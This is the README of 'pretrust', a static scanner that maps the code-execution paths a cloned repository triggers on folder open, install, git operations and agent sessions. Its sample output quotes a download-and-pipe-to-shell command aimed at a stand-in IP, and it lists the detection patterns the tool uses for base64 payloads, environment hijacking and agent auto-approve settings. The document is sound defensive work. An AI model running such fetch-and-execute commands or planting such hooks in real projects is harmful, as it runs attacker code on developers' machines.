# pretrust

**Map every code-execution path that fires when you open or clone a repository — before you run anything.** Deterministic, offline, zero-dependency. Editor- and agent-agnostic.

[![CI](https://github.com/hamodywe/pretrust/actions/workflows/ci.yml/badge.svg)](https://github.com/hamodywe/pretrust/actions/workflows/ci.yml)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)

```
pretrust  ./some-cloned-repo

  9 execution paths that run without you asking  —  6 high · 2 low · 1 info

  ● HIGH   vscode-tasks   .vscode/tasks.json:9
      VS Code task runs on folder open
      runs when the folder is opened · lands on host · gate: workspace-trust
      $ curl -fsSL http://192.0.2.10/i.sh | sh
      ! downloads and pipes the response into an interpreter
      Executes on your machine as soon as the folder is opened and trusted — task "bootstrap".
```

---

## The problem

You clone a repository and open it in your editor. Before you have read a line of its code — before you have *run* anything — code has already executed on your machine.

This is not hypothetical. It is the most active developer-targeting attack of 2026:

- A `.vscode/tasks.json` task with `runOptions.runOn: "folderOpen"` runs the instant the folder is opened. In January 2026 a North-Korea-linked campaign used exactly this to compromise **21 contributors' repositories in 72 hours**, and the Shai-Hulud worm used it for persistence. ([microsoft/vscode #309406](https://github.com/microsoft/vscode/issues/309406))
- A repo-controlled `SessionStart` hook in `.claude/settings.json` runs a shell command when a coding agent opens the project (**CVE-2025-59536**); an `env` block can point `NODE_OPTIONS` or `BASH_ENV` at repo files so an ordinary interpreter loads them (**CVE-2026-21852**).
- A `.vscode/settings.json` shipping `chat.tools.autoApprove` turns off the agent's per-tool confirmation, so once you click "trust", it runs commands with no prompt.
- A dev container's `initializeCommand` runs on your **host**, not in the container you opened it for isolation.
- `npm install` runs `postinstall`. `direnv` runs `.envrc`. A committed `.husky/` hook runs on your next commit.

Datadog and Pillar Security both published research on this in 2026 and reached the same conclusion: *"an attacker only needs one hiding place, but a reviewer has to find them all."* There are a lot of hiding places, spread across editors, agents, git, and the shell — and no single tool enumerates them.

## What pretrust does

pretrust reads a repository and produces the complete map: **what runs, when it fires, and where control lands** — for every auto-execution surface at once. It is the check you run on an untrusted repo *before* you open it in your editor.

The central design decision is that an execution path is a **fact about a file**, not a guess about intent. `pretrust` proves the path exists (`this tasks.json will run on folderOpen`) rather than scoring how evil it looks. That is what separates it from a signature scanner, which can only recognise attacks it has already seen.

Two layers:

1. **The inventory** — every path that runs without you asking, classified. This is always correct and always useful, even for an honest repo: it tells you the six things that will execute and when.
2. **The risk overlay** — a small set of documented, provably-suspicious traits (a command that downloads and pipes into a shell, a base64 payload, an `initializeCommand` on the host, an agent set to auto-approve) that lift a path out of the plain inventory. Marked with `!`.

The load-bearing promise, tested against a fixture of ordinary husky hooks and native-addon `postinstall` scripts, is that **an honest repository produces a map and no `high` findings**. A tool that cries wolf on every `npm run build` is a tool you learn to ignore.

## Install

```bash
npm install -g pretrust
# or run without installing
npx pretrust ./path-to-repo
```

Requires Node.js ≥ 20.10. No runtime dependencies.

## Quick start

```bash
# Scan a repo you just cloned, before opening it in your editor
pretrust ./suspicious-repo

# Only show the things that carry a risk signal
pretrust ./suspicious-repo --min high

# Use it as a gate in CI (exit 1 if anything is high)
pretrust . --fail-on high

# Report only the execution paths THIS branch adds versus main
pretrust . --diff main --fail-on high

# Accept the current paths as a baseline, then fail only on new ones
pretrust . --update-baseline
pretrust . --baseline .pretrust-baseline.json --fail-on high

# Learn what each surface is, when it fires, and why
pretrust explain
pretrust explain devcontainer

# Machine-readable output
pretrust . --json
pretrust . --sarif > pretrust.sarif
```

### Made for pull requests

Two features make pretrust practical on a real, messy codebase instead of only a
fresh clone:

- **`--diff <ref>`** reports only the execution paths a change *adds* relative to a
  git ref. On a PR, `pretrust . --diff origin/main --fail-on high` fails only when
  the branch introduces a new high-severity path — pre-existing inventory does not
  block the build. The base is read through git plumbing; nothing is executed.
- **`--baseline`** records the paths you have already reviewed and accepted (with
  `--update-baseline`), then fails only on paths that are new relative to that
  record — the lint-baseline pattern, applied to execution surfaces.

### Exit codes

| Code | Meaning |
|------|---------|
| `0` | No findings at or above `--fail-on` (default: `high`) |
| `1` | Findings at or above `--fail-on` |
| `2` | Usage or runtime error |

### Options

| Option | Purpose |
|--------|---------|
| `--diff <ref>` | Report only paths added versus a git ref |
| `--baseline <file>` | Suppress paths recorded in a baseline; fail on new ones |
| `--update-baseline` | Write the current paths to the baseline and exit |
| `--min <severity>` | Report only findings at or above this level (default `info`) |
| `--fail-on <severity>` | Exit non-zero at or above this level (default `high`; `none` disables) |
| `--json` / `--sarif` | Machine-readable output |
| `--color` / `--no-color` | Force colour (default: auto) |

Plus the `pretrust explain [surface]` subcommand.

## Surfaces

pretrust covers the execution paths that fire before you deliberately run project code. Each is reported by **trigger** (when it fires) and **boundary** (where control lands).

| Surface | File(s) | Trigger | Lands on |
|---------|---------|---------|----------|
| `vscode-tasks` | `.vscode/tasks.json` | folder open | host |
| `vscode-settings` | `.vscode/settings.json` | agent session | agent |
| `devcontainer` | `.devcontainer/**/devcontainer.json` | container build | host (`initializeCommand`) / container |
| `npm-lifecycle` | `package.json` | install | host |
| `python-startup` | `sitecustomize.py`, `usercustomize.py`, `conftest.py` | interpreter start | host |
| `git-hooks` | `.husky/`, `.githooks/`, `.git/hooks/` | git operation | host |
| `git-config` | `.git/config` | git operation | host |
| `direnv` | `.envrc` | cd into directory | host |
| `agent-hooks` | `.claude/settings.json` (+ `.local`) | agent session | host / agent |
| `mcp` | `.mcp.json`, `.vscode/mcp.json`, `.cursor/mcp.json`, `.gemini/settings.json`, `.codex/config.toml` | agent session | host |

### Risk signals

The `!` lines. Each is a stated textual pattern, not a black-box score:

| Signal | What it means |
|--------|---------------|
| `fetch-execute` | Downloads content and pipes it straight into an interpreter (`curl … \| sh`) |
| `obfuscated` | Decodes a base64 / hex payload, or builds and `eval`s code at runtime |
| `env-hijack` | Sets `BASH_ENV` / `NODE_OPTIONS` / `PYTHONPATH` etc. to redirect what interpreters load |
| `writes-autostart` | Writes into another auto-execution surface (`.bashrc`, a git hook, crontab) |
| `host-escape` | Runs on the host from an otherwise container-isolated surface |
| `auto-approve` | Disables the confirmation a coding agent would otherwise ask for |
| `hidden-target` | Invokes a dotfile as an executable |
| `os-branch` | Branches behaviour by operating system (weak on its own; a dropper hallmark) |

Severity is deliberately legible: a **strong** signal on the host is `high` (inside a container, `medium`); a `host-escape` alone is `medium`; everything else is inventory (`low` / `info`), more prominent when it fires on open than on a later deliberate act.

## How it compares

| | pretrust | IOC scanners (e.g. agentic-ioc-scanner) | single-agent config linters |
|---|---|---|---|
| Approach | Enumerates execution **capability** | Matches known-malware **indicators** | Checks one agent's config |
| Sees a novel attack | **Yes** — the surface is the same | No — needs an IOC update | Only if in that one agent |
| Editor + agent + git + shell | **All** | Partial | One tool |
| Ages | Well — surfaces change slowly | Rots as campaigns mutate | — |
| Output | Inventory + risk overlay + SARIF | Hits | Hits |

pretrust does not try to tell you a repository is *safe* — nothing can. It tells you exactly what will run and when, so the review you do is a review of a known list instead of a hope that you found everything.

## Limitations

Stated plainly, because a security tool that oversells itself is worse than none:

- **pretrust reports capability, not intent.** A `postinstall` that builds a native addon and one that exfiltrates your keys are both "runs on install"; the risk overlay flags the *provably* suspicious, but a clever payload with no signal will sit in the inventory as `info`. Read the inventory; do not only read the red lines.
- **It is a static reader.** It does not execute anything, resolve variables, or follow a command into a script it invokes. A hook that runs `./setup.sh` is reported; what `setup.sh` then does is that file's own paths (and often not one pretrust models).
- **The command analyser is pattern-based.** It is tuned to be specific rather than exhaustive — it will miss novel obfuscation, and it deliberately does not flag ubiquitous-but-benign patterns like prepending `node_modules/.bin` to `PATH`.
- **The TOML reader is a documented subset** (enough for `.codex/config.toml`), not a general TOML parser.
- **It does not cover prompt injection.** Agent *rules* files (`.cursor/rules`, `CLAUDE.md`) can steer an agent, but that is instruction, not direct code execution, and out of scope here.

## FAQ

**Is this a malware scanner?** No. It is a capability map. It will happily show you that an entirely honest repo has six execution paths, because it does. The value is knowing the list.

**Won't it flag every normal repo?** Every repo with a build step has install hooks and maybe a husky hook — those appear as `info`/`low` inventory, not alarms. The clean-repo test fixture asserts zero `high` and zero `medium` on a legitimate husky + `node-gyp` project.

**Why not just enable Workspace Trust?** Trust is one binary click for the whole repo, and folder-open tasks run the moment you grant it. pretrust shows you *what* you would be trusting, per surface, before you decide.

**Can I run it in CI?** Yes — `pretrust . --fail-on high` gates a PR, and `--sarif` uploads to GitHub code scanning. See [`examples/`](examples/).

## Architecture

```
src/
  model.ts            the vocabulary: Finding, Trigger, Boundary, Gate, Signal
  severity.ts         the (legible) grading rule
  signals/command.ts  the risk overlay — documented textual detectors
  parse/              tolerant JSONC + a minimal TOML subset, with line anchoring
  surfaces/           one scanner per execution surface (pure: files in, findings out)
  scan/               the filesystem walk and the orchestrator
  report/             terminal, JSON, and SARIF renderers
  cli.ts              a thin, testable wrapper over the above
```

Every surface scanner is a pure function of `(files, read) → findings`, which is why the whole thing is deterministic and trivially testable. See [docs/architecture.md](docs/architecture.md).

## Contributing

New surfaces are welcome — the bar is that a finding must be a *provable fact* about the file, and every new surface ships with a fixture it is supposed to stay silent on. See [CONTRIBUTING.md](CONTRIBUTING.md).

## License

[MIT](LICENSE) © hamodywe
